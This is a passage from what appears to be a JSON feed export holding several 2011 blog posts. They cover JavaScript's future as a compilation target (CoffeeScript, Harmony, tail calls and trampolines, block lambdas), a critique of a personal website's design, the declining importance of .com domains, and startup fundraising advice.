<dt>@littlecalculist<dt>\n        <dd>Might I suggest you keep breathing? ;-) Seriously, I do hope to try, but trust me, macro system design is hard.</dd>\n    </dt></dt></dt></dt></dt></dt></dl>\n</blockquote>\n\n<p>The message is pretty clear. JavaScript macros are not just around the corner.</p>\n\n\n<h2>Harmony Syntax ETA</h2>\n\n<p>Perhaps the syntax extensions in Harmony are all you dream of and more. If Harmony becomes ECMAScript 6 and ECMAScript 6 becomes ubiquitous then you’ll be all set. So all you need to do is wait...patiently.</p>\n\n<p>First, let’s look at browser adoption. Unfortunately I’ll pick on Internet Explorer a bit, which has almost become a cliche, but not because I have something against the Internet Explorer development team at Microsoft or the newest versions of Internet Explorer. It is necessary to look at this browser because it is perhaps the most important case study for estimating when features will be available for all visitors to your web site.</p>\n\n<p>As of May 2011, <a href=\"http://www.w3schools.com/browsers/browsers_stats.asp\">w3schools</a>, which has relatively tech-savvy visitors, reports Internet Explorer 6 still has 2.4% market share. <a href=\"http://marketshare.hitslink.com/browser-market-share.aspx?spider=1&amp;qprid=2\">Net Market Share</a> reports Internet Explorer 6 still has 10.36% market share. Your site probably has a market share somewhere between those two numbers but this browser is still hanging on even though it was superseded by Internet Explorer 7 in November 2006. How many people are still using Internet Explorer 6 or 7? The w3schools site shows 7.7% and Net Market Share shows 18.2%. These browsers just aren’t going away fast enough. A publicly available site (e.g. Amazon) cannot afford to ignore market share numbers this large.</p>\n    \n<p>There is no point in spending any energy moaning that users should upgrade their browsers or that “IE should die!” It won’t happen. I don’t know if it is true but someone once said to me “Internet Explorer users upgrade their browser when they upgrade their hardware.” For the past few years, hardware has certainly become sufficient that people don’t need to upgrade anything to use email, Facebook, Twitter, etc.</p>\n\n<p>Suppose your web app is sufficiently advanced that you’ve decided that you only care about users with “modern” browsers. Google Apps recently announced that on August 1, 2011 they will stop supporting Internet Explorer 7. That is almost 5 years after Internet Explorer 7 was released.</p>\n    \n<p>Now think about this: Internet Explorer 10 is not out yet but, of course, even it won’t have Harmony’s syntax extensions. Let’s estimate that Harmony is approved as ECMAScript 6 in mid-2012 and Internet Explorer 11 is released in early 2013 with support for all of Harmony’s syntax. Five years after that, in 2018, the Google Apps team can drop support for Internet Explorer 11 and finally use Harmony syntax freely. (On August 1, 2011, they are also dropping support for the four-year-old Safari 3 and two-year-old Firefox 3.5 so the waits are still long-ish for other browsers too.)</p>\n\n<p>Amazon developers might need to wait an additional 5 years before they can use Harmony syntax. That’s 2023!</p>\n\n<p>Will you be satisfied waiting 7-12 years before you can start using syntax that would be helpful developing your web apps today? Being more optimistic, even if the wait is just 5 years, will you wait?</p>\n\n\n<h2>JavaScript is Dead.</h2>\n\n<p>Cause of death: semicolon cancer.</p>\n\n<p>Perhaps due to JavaScript’s syntax alone, JavaScript does not have macros now and won’t have them soon if ever. Millions of programmers use JavaScript now and plenty of them are tired or tiring of the verbose idioms confronting them daily. They want new syntax now and won’t wait. For this growing group of developers, JavaScript the source code language is dead.</p>\n\n<p>You had a good reign, JavaScript. We had some good times and wrote some cool apps together. May you rest in peace.</p>\n\n\n<h2>Long Live JavaScript!</h2>\n\n<p>Programmers like to control their own destiny and they are taking action. You can have all the new syntax you want for your browser scripts, right now, if you write in another source language and compile to the ECMAScript 3 dialect of JavaScript for the billions of browsers in the wild. By compiling to ECMAScript 3 you are completely freed from JavaScript’s syntactic evolution. As an added bonus, you can even <em>fix</em> some of JavaScript’s semantic gotchas with a sufficiently sophisticated compiler. JavaScript’s new life is as a compilation target.</p>\n\n\n<h2>Languages that Compile to JavaScript</h2>\n\n<p>There have been compilers to JavaScript for years now. In 2007, I started collecting a list of languages with compilers to JavaScript. There were JavaScript extension languages: the now-defunct ECMAScript 4, Narrative JavaScript, and Objective-J. There were pre-existing languages: Scheme, Common Lisp, Smalltalk, Ruby, Python, Java, C#, Haskell, etc. There were even brand new languages HaXe, Milescript, Links, Flapjax that were designed to address web programming needs.</p>\n\n<p>Of these compiler projects, Google’s GWT Java-to-JavaScript compiler has probably been the most successful but I don’t see programmers who first learned a language other than Java rushing to use Java as their source code language. In fact, none of these compiler projects have accrued a significant long-term user base. At least in the parts of the web that I frequent, with the exception of GWT, it is rare to read about programmers using these compilers for any real projects. There are several legitimate reasons not to use one of these compilers.</p>\n\n<p>Imagine you build a big project using one of these compilers and part way through find a bug in the compiler. The one maintainer of the compiler may have lost interest or time. Do you want to maintain a compiler? Does anyone on your team have the skills to do that? That ulcer is going to get pretty big while you prepare to explain to the CEO that you now need to rewrite the UI in JavaScript.</p>\n\n<p>Just the thought of debugging compiled code when a production bug is filed makes my stomach churn. Core dump. What line number in the source code matches the line number Firebug is reporting for the compiled code? HURRY! That bug needs to be fixed now!!!!</p>\n\n<p>You’ve used Objective-J for a big project and now you need to hire a new good programmer. What are your chances of finding the right person? They are probably very low. Just finding an available JavaScript programmer is difficult enough. If you use one of these alternate languages, it is very likely you’ll need to train each new person you add to your team.</p>\n\n<p>Even without these compiler projects being wildly successful, the list of languages that compile to JavaScript has continued to grow. There is no doubt that writing a to-JavaScript compiler is a very cool project. Please pay me to write one.</p>\n\n<p>There is one notable new entry in the list of languages that compile to JavaScript that is actually causing a big stir and is possibly changing the game for good.</p>\n\n\n<h3>CoffeeScript</h3>\n\n<p>I can tell you right now, I don’t know why CoffeeScript has the magic combination of features to garner the attention it has when other projects have failed. Significant whitespace and arrow function syntax. My gut reaction is yuck. There is plenty of things to like: default parameter values, rest parameters, spread, destructuring, fixing the whole implied global mess, even classes if you’re into that kind of thing and more. Many of CoffeeScript’s features are part of Harmony and so may be in browsers sometime in the future but if you use CoffeeScript then you can have them now. There is nothing like instant gratification.</p>\n\n<p>Programmers are bursting with affection for CoffeeScript.</p>\n\n<blockquote>\n    <dl>\n        <dt>@pyronicide</dt>\n        <dd>Being able to use default values for function arguments in #coffeescript makes me immensely happy.</dd>\n    </dl>\n</blockquote>\n\n<blockquote>\n    <dl>\n        <dt>@_jdpage</dt>\n        <dd>CoffeeScript is wonderful. Now I am spoiled and will complain whenever I have to write JavaScript instead.</dd>\n    </dl>\n</blockquote>\n\n<p>At the TXJS 2011 conference, Douglas Crockford apparently shared that he thinks “CoffeeScript is clearly good stuff.”</p>\n\n<p>There is one aspect of the CoffeeScript project that I really like and it is summed up by the following two quotations. The first comes from Trevor Burnham, author of <a href=\"http://pragprog.com/titles/tbcoffee/coffeescript\">CoffeeScript: Accelerated JavaScript Development</a>.</p>\n\n<blockquote>\n    <dl>\n        <dt>@trevorburnham</dt>\n        <dd>[...] It’s not about turning JS into Ruby/Python; it’s about having a syntax better suited to JavaScript’s inner goodness.</dd>\n    </dl>\n</blockquote>\n\n<p>The second is from <a href=\"http://arcturo.com/library/coffeescript/00_introduction.html\">The Little Book on CoffeeScript</a>.</p>\n\n<blockquote>\n    <p>CoffeeScript neatly sidesteps these [JavaScript issues], by only exposing a curated selection of JavaScript features.</p>\n</blockquote>\n\n<p>The attitude expressed in these quotations really is great and genius marketing too. It is not CoffeeScript verse JavaScript. It is CoffeeScript enhancing the JavaScript programming experience. Could some different syntax and a restricted subset of JavaScript’s features really be better than plain old JavaScript?</p>\n\n<p>Douglas Crockford seems to think so. For years, his <a href=\"http://jslint.com/\">JSLint</a> has been hurting our feelings and demanding that we use very specific whitespace and syntax and that we avoid dangerous JavaScript features. Source code that passes JSLint has access to a true subset of JavaScript: the subset that he calls “the good parts.” This dialect of JavaScript deserves a name. Maybe GoodScript? After all, you are only allowed to use JSLint for good and not for evil.</p>\n\n<p>The ECMAScript committee also thinks this is a good idea. The <code>\"use strict\"</code> pragma introduced in ECMAScript 5 not only restricts some language features like <code>with</code>, strict mode even changes/fixes the semantics of some parts of the language. Because of the semantic changes, ECMAScript 5 strict is a different language or at least a different dialect than ECMAScript 5 non-strict.</p>\n\n<p>CoffeeScript, GoodScript, and ECMAScript 5 strict share common goals of keeping you away from the dangerous parts of JavaScript while giving you access to the valuable, safe parts. Each enforces these goals differently but they are enforced one way or another. You don’t get new syntax with GoodScript. It is already JavaScript and ready for the browser. You don’t get to use ECMAScript 5 strict because it is not available in all browsers yet and won’t be for years.</p>\n\n<p>So CoffeeScript seems to be targeting a particular need of web development and maybe that is something other to-JavaScript compilers haven’t done or haven’t done well before.</p>\n\n<p>CoffeeScript is also a reasonably thin skin over JavaScript. One consequence of this is that the compiled JavaScript code is reasonably easy to read and not brutal to debug (so I’m told.) This reduced debugging fear is contributing to interest in CoffeeScript.</p>\n\n<p>CoffeeScript almost feels like a set of macros for writing JavaScript programs.</p>\n\n<p>Since CoffeeScript compilers are in the hands of developers rather than the visitors to sites, you control which version of CoffeeScript you are using. You can upgrade at will. This also means CoffeeScript does not need to be standardized and go through the subsequent painfully slow growth of a standardized language. CoffeeScript can grow at the rate of its community’s imagination and desire. JavaScript standardization was essential to the success of the web but the same constraints do not apply to CoffeeScript.</p>\n\n\n<h2>Well then I’m going to invent my own language.</h2>\n\n<p>You can do this and it would be a great exercise. You’ll be able to call yourself a compiler writer which is pretty darned prestigious.</p>\n\n<p>The danger of inventing your own language lies in the thinking that you can do better than JavaScript has done <strong>in the long run</strong>. Language design is hard and I bet your language will grow its share of unsightly hairs. Maybe not as many hairs as JavaScript but still. CoffeeScript hasn’t hit puberty yet but there are already signs that hair follicles may exist.</p>\n\n<blockquote>\n    <dl>\n        <dt>@maxsamukha</dt>\n        <dd>CoffeeScript: The way variables in outer scopes can be accidentally overwritten is fishy. How bad is it in practice?</dd>\n    </dl>\n</blockquote>\n\n<p>You were so proud that your simple, readable compiled code was easy to debug. That will become harder as you realize the compiled code’s semantics aren’t quite what they were supposed to be in corner cases.</p>\n    \n<p>Idioms will appear in your language and someone will fork your compiler to do away with those idioms (unless your language happens to have macros.)</p>\n\n<p>Enough with this nay saying. Go and write your own language right now. You’ll be a better programmer for it.</p>\n\n\n<h2>What’s missing from JavaScript the target language?</h2>\n\n<p>JavaScript is embarking on a new life as a compilation target. It is a capable target for many language features but it could use improvement. In his <a href=\"http://brendaneich.com/2011/05/my-jsconf-us-presentation/\">JSConf.US talk</a>, Brendan Eich stated that one the goals for Harmony is to be a better target for to-JavaScript compilers.</p>\n\n<p>Compiled JavaScript can run slower than hand-written JavaScript just like compiled C can be slower than hand-written Assembly (though not always.) Some inefficiency in compiled JavaScript is tolerable because JavaScript virtual machines are fast and the DOM is the bottleneck anyway. That said, some potential source code languages have semantics sufficiently far from JavaScript’s semantics that the compiled code is so inefficient that it cannot realistically be used in production web apps. There are already features in Harmony that will enable some of these languages to be compiled to efficient code and thus make these viable source code languages.</p>\n\n\n<h3>Proper Tail Calls</h3>\n\n<p>Programs in Lisp languages depend heavily on recursive calls to properly tail recursive procedures. The <a href=\"http://wiki.ecmascript.org/doku.php?id=harmony:proper_tail_calls&amp;s=const\">proper tail calls</a> proposal in Harmony will allow these programs to be compiled to JavaScript without the inefficient trampoline technique currently necessary to avoid overflowing the call stack. Awesome! Let’s look at that in a bit more detail.</p>\n\n<p>The following JavaScript is an example of mutually recursive functions which would work fine in Lisp but since JavaScript currently does not have proper tail calls, will overflow the JavaScript call stack when <code>number</code> is large.</p>\n\n<pre><code>function isEven(number) {\n    if (number === 0) {\n        return true;\n    }\n    else {\n        return isOdd(number - 1);\n    }\n}\n\nfunction isOdd(number) {\n    if (number === 0) {\n        return false;\n    }\n    else {\n        return isEven(number - 1);\n    }\n}\n\nisEven(100000); // InternalError: too much recursion</code></pre>\n\n<p>In the above code, a call to <code>isEven(100000)</code> isn’t complete and removed from the call stack until <code>isOdd(99999)</code> returns which isn’t complete and removed from the call stack until <code>isEven(99998)</code> returns and so on. That’s a lot of calls on the call stack! And there is no need for them all to be on the call stack. <code>isEven(100000)</code> doesn’t have anything intelligent remaining to do once it calls <code>isOdd(99999)</code> because the call to <code>isOdd(99999)</code> is the very last thing in <code>isEven(100000)</code>. The call is said to be in tail position. <code>isEven(100000)</code> is just waiting to return the value returned by <code>isOdd(99999)</code> and a clever language can just pop <code>isEven(100000)</code> off the call stack and replace it with the call to <code>isOdd(99999)</code> thus saving space on the call stack.</p> \n\n<p>With trampolines we can ensure that even in JavaScript the call stack doesn’t grow large. The following is just a sketch of how trampolines might be implemented and how <code>isEven</code> and <code>isOdd</code> might be compiled for a JavaScript interpreter that doesn’t have proper tail calls.</p>\n\n<pre><code>function bounce(ret) {\n    while (typeof ret === 'function') {\n        ret = ret();\n    }\n    return ret;\n}\n\nfunction isEven(number) {\n    if (number === 0) {\n        return true;\n    }\n    else {\n        return function() {\n            return isOdd(number - 1);\n        };\n    }\n}\n\nfunction isOdd(number) {\n    if (number === 0) {\n        return false;\n    }\n    else {\n        return function() {\n            return isEven(number - 1);\n        };\n    }\n}\n\nbounce(function() {return isEven(100000);}); // true</code></pre>\n\n<p>You can see the extra overhead of the <code>bounce</code> function which implements the trampoline calls is quite onerous. It creates closures for each continuation, doubles the number of calls, and must examine the returned value after each bounce; however, <code>isEven(10000)</code> does complete and is removed from the callstack <em>before</em> <code>isOdd(99999)</code> is called. The full computation completes in constant call stack space.</p>\n\n<p>The bottom line is trampolines incur too much overhead. They incur so much overhead that when Rich Hickey created Clojure, his Lisp for the JVM, he decided his language could not have proper tail calls because trampolines were too expensive. That must have been a painful decision for someone who loves the Lisp family of languages.</p>\n\n<p>The good news is that the ECMAScript committee has recognized this deficiency in JavaScript and has added proper tail calls to Harmony. This will benefit programmers writing directly in JavaScript and developers of to-JavaScript compilers.</p>\n\n\n<h3>Lambdas</h3>\n\n<p>Another strawman proposal not yet promoted to Harmony is the <a href=\"http://wiki.ecmascript.org/doku.php?id=strawman:block_lambda_revival\">Block Lambda Revival</a> which combines some new syntax with a new language construct called a lambda. A lambda is a callable thing, like a function, but it obeys Tennent’s Correspondence Principle. Tennent’s Correspondence Principle states that wrapping an expression or block of code in an immediate lambda should not change the meaning of that wrapped code. JavaScript functions are not lambdas and do not obey Tennent’s Correspondence Principle. For example,</p>\n\n<pre><code>function one() {\n    return 1;\n}\n\none(); // 1</code></pre>\n\n<p>is not the same when the return line is wrapped in an immediate function</p>\n\n<pre><code>function one() {\n    (function() {\n        return 1;\n    }());\n}\n\none(); // undefined</code></pre>\n\n<p>The syntax of the block lambda proposal for a lambda that takes two arguments and sums them is <code>{|a, b| a + b}</code></p>\n\n<p>Using the syntax of the block lambda proposal  we can wrap the return line in an immediate lambda without changing the meaning.</p>\n\n<pre><code>function one() {\n    ({||\n        return 1;\n    }());\n}\n\none(); // 1</code></pre>\n\n<p>Thanks to lambdas obeying Tennent’s Correspondence Principle, the <code>return</code> still means return from the function <code>one</code>.</p>\n\n<p>You may ask “Who cares about this computer science-y stuff?” to which I reply “Did any of that macro business seem useful?” because lambdas are a fundamental building block in the code generated by many macros. And since lambdas play nicely with JavaScript’s <code>return</code>, <code>arguments</code>, and <code>this</code>, lambdas would be a valuable addition to the language for compiler writers.</p>\n\n<p>I’m focusing on the JavaScript-as-a-target aspect of the block lambda proposal. If you plan on writing in JavaScript forever after, the proposal has other benefits for you too that don’t matter to compiler writers.</p>\n\n<p>The block lambda strawman has not yet been promoted to Harmony and so currently doesn’t have a path into ECMAScript 6 and browsers around the world. The standardization process is slow. Maybe there will be another decade stall in evolving the language like there was after ECMAScript 3. Maybe the next edition of ECMAScript will be the last edition. Better to get the best stuff in there than hope to get it in later. If you care about the future of JavaScript and think lambdas would be a benefit to the language then <strong>let the ECMAScript committee know by sending a message to the <a href=\"https://mail.mozilla.org/listinfo/es-discuss\">es-discuss mailing list</a> in support of the block lambda proposal</strong>. Powerful, orthogonal language features like tail calls and lambdas which have no efficient workarounds may be the most important additions in the next edition of ECMAScript.</p>\n\n\n<h2>What’s missing from the browser?</h2>\n\n<p>The browser can help JavaScript succeed in its new life as a compilation target. The browser interprets compiled JavaScript and complains when the compiled code has an error. The error messages contain line numbers in the compiled code but you want to know the line number in source code.</p>\n\n<p>The Mozilla crowd has <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=618650\">an open ticket</a> and <a href=\"https://wiki.mozilla.org/DevTools/Features/SourceMap\">a dev tools project</a> to ease debugging source code by mapping compiled code lines to source code lines. Since you control the browser in which you primarily develop and test, you can use this feature as soon as it is ready.</p>\n\n<p>Somewhere I read that the Webkit folks are developing similar source code debugging assistance but I cannot find any concrete evidence.</p>\n\n\n<h2>Polyglot</h2>\n\n<p>JavaScript’s monopoly in the browser has meant front-end programmers all speak the same language. This has given the community a <i>lingua franca</i> enabling good communication and code sharing. We are now headed for a polyglot future where you choose the language(s) you want to learn and use for developing browser applications. Maybe you are only using a few JavaScript language extensions via <a href=\"http://code.google.com/p/traceur-compiler/\">Traceur</a> and compiling templates to JavaScript with <a href=\"http://mustache.github.com/\">Mustache</a>. This still means that the CoffeeScript programmer won’t understand your source code immediately.</p>\n\n<p>This divergence was inevitable as it has happened on all previously successful platforms. There have been multiple languages for building native applications almost forever. C is still common but C++, Objective-C, and many other languages are available. The JVM was intended to run programs written in Java but clever developers have added other languages like Clojure and JRuby as options. Microsoft recognized what seems to be a human psychological need for a variety of languages and developed its .NET CLR platform for multiple languages from the beginning. Programs written in Basic, C#, IronPython, etc can all be run on the CLR.</p>\n\n<p>Barriors to communication in the front-end community are not new anyway. A developer using Dojo cannot immediately understand the source code of an application written with jQuery or YUI. There is a plethora of libraries, some very different, that add the ideas of class-based inheritance to JavaScript. So we already have our barriors even within JavaScript.</p>\n\n<p>Having multiple source languages will increase the barriers in our community. Programmers will still need to know JavaScript, at least for a while, but in a few years they may know other source languages better then they know JavaScript.</p>\n\n<p>Choice is a blessing and a curse.</p>\n\n\n<h2>Summary</h2>\n\n<p>It is great having the opportunity to watch JavaScript’s transition to a new life as it happens. It’s impossible to say which languages will end up winning market share in the to-JavaScript compilation but it is sure to be interesting. CoffeeScript is gaining momentum now but I think many other successful source code languages will follow.</p>\n\n<p>What do you think will happen?</p>"

Currently I am managing self-started websites with about two million visitors per month – all with the aim to share useful resources to people.”</p>\n<p>Here is a screenshot of the homepage:</p>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-1.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<h2>Initial Impressions</h2>\n<p>Ray Cheung is a man who needs very little design instruction. He has not one but several very successful web ventures, all of which look great and his homepage is no exception. </p>\n<p>The overall theme is pretty interesting: a wooden background with a stack of papers to hold the content. However, instead of using a paper texture, Ray went with a star field background. It sounds crazy but the overall effect is quite nice! I love it when designers do something unexpected rather than just running with a trend.</p>\n<p>The stacked page effect is reminiscent of a <a rel=\"nofollow\" href=\"http://safe.tumblr.com/theme/preview/3292\">popular Tumblr theme</a>, but the similarities really stop there as overall layout and design is fairly different.</p>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-2.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>At a glance I really like what Ray has done here. Let’s dive in and take a closer look at some of the sections.</p>\n<h2>Texture and Color</h2>\n<p>As I mentioned above, the space and wood textures are an unlikely combination, but both are very well designed and seem to work perfectly together. I like the dark color palette that results from the two:</p>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-3.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<h2>Fonts</h2>\n<p>When you have a fairly bold visual theme, it can be overwhelming to combine it with some crazy typography. The general idea is that you don’t want too many objects competing for attention.</p>\n<p>In light of this, Ray made a solid choice in being conservative with his fonts. All of the typography is comprised of easily readable sans-serif typefaces. The main site header is bold, followed by an ultra light variant (perhaps too light). These and the bold condensed section headers are images with the live body copy in Arial. It would be great to see some @font-face integration to bring some of this type live, but the images are pretty tiny so I don’t really think it’s a big deal (though whipping up a sprite or two wouldn’t hurt).</p>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-4.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<h2>Navigation</h2>\n<p>Between these critiques and our design gallery, I’ve taken a close look at a <em>ton</em> of website designs over the years. It’s not often that I see a trick that I’ve never come across before. Ray’s navigation though genuinely surprised me. I don’t believe I’ve ever seen this particular effect.</p>\n<p>The design of this section is simple and works beautifully with the overall page. I love the contrast of the slightly extruded buttons and the inset section under them.</p>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-5.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>When you click on one last two buttons, the page automatically scrolls to take you to that section, a pretty typical idea. However, the other two buttons link to two sections that are already at the top of the page so when you click these their respective sections actually shake back and forth in a smooth animation. It’s a pretty simple effect that makes the site seem more dynamic and almost alive and friendly.</p>\n<h2>Sections</h2>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-7.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>The page is broken up into two vertical columns. On the are the various projects that Ray has worked on and on the left are miscellaneous small sections of content: About Me, My Skills, Reading and Recognitions.</p>\n<p>Each section is topped with a header and a little icon, another little feature that instantly makes me think of Tumblr. </p>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-6.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>These sections are clearly distinct and easy to hone in on individually. Each has a unique design but they tie in together well. One small thing that I would consider on the “My Skills” section is coloring the horizontal bars to match their respective portions of the circular graph. This would help the consistency of the two graphics and immediately communicate how they’re connected.</p>\n<h2>Intelligent Scrolling</h2>\n<p>Another thing that I really like about this site is how Ray thought through the scrolling functionality. The left column ends at the contact form and the right column is significantly longer. As you scroll down the page, the entire page scrolls uniformly as you would expect right up until you hit the contact form. At this point, the left column stops scrolling and the right column continues.</p>\n<p>Touches like these just show how much time was spent thinking about how to make the site more user friendly. </p>\n<h2>Lights Off!</h2>\n<p>One of the few things I wasn’t quite sure about on the site was the switch near the top to turn the lights off. I expected that once I hit this switch, the theme would change somehow. Maybe the wood background would fade into black revealing more stars or something else equally interesting.</p>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-8.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>However, when you hit the switch, this is what you get:</p>\n<div><a rel=\"nofollow\" href=\"http://raycheung.me/\"><img src=\"http://designshack.co.uk/wp-content/uploads/DSCRT-56-9.jpg\" alt=\"screenshot\" width=\"510\"></a></div>\n<p>I understand the message here: save energy by turning off the lights. However, the implementation is a bit awkward. This page gives you no way to go back to the site in the case that you were just pressing the button to see what it did, nor does it direct you anywhere else such as one of Ray’s other projects or some resources on saving energy. Another confusing element is the “Battery is running low” message in the site footer. This may be connected to the message in the header, but it’s pretty unclear.</p>\n<p>I think the intentions are good here but the result is bringing down my perceived quality of the site and I think if these are going to be kept they need to be rethought.</p>\n<h2>Conclusion</h2>\n<p>In closing, I think Ray has created a great web page here to introduce you to himself. The page clearly states who he is and what he does and looks great doing it. The layout is logical and easy to follow, the design is unique and interesting and the content is, for the most part, relevant. </p>\n<p></p>\n<div></div>\n<p></p>\n<h2>Your Turn!</h2>\n<p>Now that you’ve read my comments, pitch in and help out by giving the designer some further advice. Let us know what you think is great about the design and what you think could be stronger. As always, we ask that you also be respectful of the site’s designer and offer clear constructive advice void of any harsh insults.</p>\n<p><br> \n<br> <a rel=\"nofollow\" href=\"http://polldaddy.com/poll/5142979/\">How would you rate the design of Ray Cheung?</a><span style=\"font-size:9px\"><a rel=\"nofollow\" href=\"http://polldaddy.com/features-surveys/\">Market Research</a></span><br>\n</p>"

      "direction" : "ltr",
      "content" : "While discussing possible names for a product recently, someone asked me if we were at the point where getting the perfect domain name was less important than it used to be. While I'm still a sucker for a clean .com, it does seem less important, and it will continue to become less important, for at least five reasons:<a name=\"more\"></a><br><br><h3>1) Google</h3>There was as time when you knew your friend's and family member's phone numbers. There may have been a time when you knew the addresses of people you emailed a lot. And there was a time when I knew how to get across town without using my navigator. Software has taken over these jobs from our brains, because it's better at it. Domain names are like phone numbers and email addresses—unique identifies that allow computers to disambiguate from the more natural (but likely non-unique) handles our brains like. (Put aside that domain names are actually the human readable system for IP addresses. They're still computery.)<br><br>If you start typing \"bob\" into the To: field in your email client, it will give you some choices of the Bob's you've emailed before, which is almost always good guess. If it's wrong, you go look up the address and then probably copy+paste it in without really paying attention to what it is.<br><br>A lot of people use Google this same way. The first time how saw how often people got to Yahoo by typing yahoo.com into Google, I was shocked. And as <a href=\"http://www.readwriteweb.com/archives/facebook_wants_to_be_your_one_true_login.php#comment\">this famous comment thread shows</a>—where thousands of Facebook users showed up to a blog post talking about Facebook logins and got confused because typing \"facebook login\" into Google was how they got there—Google is how normal people get around the web. This probably wouldn't be true if Google wasn't so damn fast. But it is. It's the auto-complete of the web. Well, one of them...<br><br><h3>2) Auto-Complete Address Bars</h3>For those slightly more sophisticated users, the auto-complete/suggest feature in browser address bars saves our brain from remembering domains once we've been there once or twice. In fact, with Chrome, Google has combined the search box and the address bar in such a beautiful way, that you don't really have to remember anything.<br><br><h3>3) Mobile Web Browsers and Hidden Address Bars</h3>One thing that keeps our awareness on domains is that we see them at the top of every web page we go to. However, this isn't as true when browsing the web from your mobile device. Because of space constraints, the address bar is more often hidden. You also don't have the status bar at the bottom that we're all used to looking at when hovering over a link to see what domain it goes to.<br><br>For the sake of simplicity and minimalism, Google may even bring the <a href=\"http://arstechnica.com/software/news/2011/05/chrome-13-introduces-experimental-hidden-nav-bar-option.ars\">hidden address bar to the desktop</a> browser. (The more I write this, the more I wonder if Google has a secret plan to kill domain names all together and make sure all navigation goes through them. Note to self: Start a conspiracy about that.)<br><br><h3>4) Apps</h3>Above, I'm still talking about web usage on the phone. But a reason a lot of people are less concerned about domains these days is, of course, installable apps. Personally, I'm not a \"the future is all about apps\" sort of guy. But clearly their usage is significant, and it eats into web usage. While almost every app has a web site of some sort, the domain name is very unimportant when most of app discovery is through stores.<br><br><h3>5) Alternative Successes</h3>The last reason getting the perfect .com is less important than it used to be is simply because others have proven you can succeed without it. A good domain name is a signal of legitimacy. As far as I know, there have been no big internet properties with .biz or .cc names. You know when you see one that it's suspect. However, you no longer necessarily suspect some alternative domains.<br><br><a href=\"http://del.icio.us/\">Del.icio.us</a> was a pioneer of the domain hack and had lots of geek cred (though Yahoo, wisely, ponied up for the <a href=\"http://delicious.com/\">real deal</a>, cuz that this was hard to type). <a href=\"http://bit.ly/\">Bit.ly</a> popularized the .ly space, now used by a bunch of startups. <a href=\"http://about.me/\">About.me</a> embraced the alternative domain as part of its name, as did <a href=\"http://last.fm/\">Last.fm</a> and the new hotness, <a href=\"http://turntable.fm/\">turntable.fm</a>. (I'm sure I'm forgetting many other examples.)<br><br>The non-perfect .com is also acceptable these days. After all, Facebook used to be at thefacebook.com. Dropbox was getdropbox.com. While those have since upgraded, their success was not predicated on that, obviously. <a href=\"http://37signals.com/\">37 Signals</a> was one of the earliest well-respected players to say, Screw it, the product is called Basecamp, but the domain is <a href=\"http://basecamphq.com/\">basecamphq.com</a>. You see this kind of thing on well-designed, well-branded products <a href=\"http://getflow.com/\">more</a> and more.<br><br>Because of these examples, the expectations change. <br><br>I don't know what will happen with the new TLDs that are to be issued. I suspect we'll just see more non-dot-com successes, which will open up the possibilities more. Which is a good thing for creators and entrepreneurs who don't have the dough to pay for the perfect .com even if wasn't being used and they could track down the owner and go through some onerous negotiation process. (Shouldn't it be easier?)<br><br><h3>Conclusion: Names are more important than domain names</h3>While a good .com name is still worth a lot, it's not as crucial to success on the internet as it used to be. And the forces that have made it less important will continue to make it less important over time (especially the mobile-related ones). I'd still opt (and pay up) for a nice, clean .com if I could get one, but I wouldn't consider it a must have.<br><br>Product and brand names, on the other hand, are just as important as ever (or more so in an increasingly  crowded internet). Too many startups have suffered a stupid name to get the domain that fit. Hopefully, entrepreneurs will feel less pressure to do that as the world becomes more auto-complete/app/mobile driven and less-dot-com biased."

Traction<br>\n2. Team<br>\n3. Product<br>\n4. Social Proof<br>\n5. Pitch/Presentation</p>\n<p>“And while all these qualities are important, Naval explained, the most important thing is to understand that: ‘Investors are trying to find the exceptional outcomes, so they are looking for something exceptional about the company. Instead of trying to do everything well (traction, team, product, social proof, pitch, etc.), do one thing exceptionally. As a startup you have to be exceptional in at least one regard.’”</p>\n</blockquote>\n<p>Here are the video and slides:</p>\n<p><iframe src=\"http://player.vimeo.com/video/25392719?portrait=0&amp;color=7f990e\" width=\"500\" height=\"281\" frameborder=\"0\"></iframe></p>\n<div style=\"width:510px\">   </div>\n<p>Some of my favorite quotes from the presentation:</p>\n<blockquote><p>“If you can’t generate traction, do you really want to raise money?”</p>\n<p>“If you need money to recruit the best, you’re not ready.”</p>\n<p>“It’s easier to pitch a new investor than to convert one.”</p>\n<p>“Capital is mobile, but capitalists are lazy.”\n</p></blockquote>\n<div>\n<a href=\"http://feeds.venturehacks.com/~ff/venturehacks?a=mB7rpKfYHd0:Fqcv4CZ3Cww:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/venturehacks?i=mB7rpKfYHd0:Fqcv4CZ3Cww:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/venturehacks/~4/mB7rpKfYHd0\" height=\"1\" width=\"1\">"

    } ],
    "content" : {
      "direction" : "ltr",
